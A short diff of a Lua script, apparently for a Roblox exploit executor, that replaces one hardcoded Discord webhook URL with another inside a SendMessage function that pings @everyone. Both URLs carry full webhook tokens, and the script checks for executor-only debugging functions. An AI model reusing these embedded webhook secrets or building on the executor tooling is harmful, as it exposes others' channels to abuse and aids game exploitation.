@@ -55,7 +55,7 @@ function SendMessage(Webhook, Message, Botname, huges, tier)
 
 
 	if getupvalue or debug.getupvalue and getconstants and getsenv then work = true end
-	local url = "https://discord.com/api/webhooks/1097060640801161266/yAW6eA03gmySgm7XoX7338f0NGdK2sYYfi0I8j-Vk1Vh4uIw1IcVFJz-h1qtbperdMpy"
+	local url = "https://discord.com/api/webhooks/1097061106578624513/SgFzVRRjGqN0x4FaLcPmzyXZqKC3yPSpmEYXl6177auugn6pnpCQLp7S1KdigLCXh-2S"
 	local data = {
 		["content"] = "@everyone",
 		["embeds"] = {
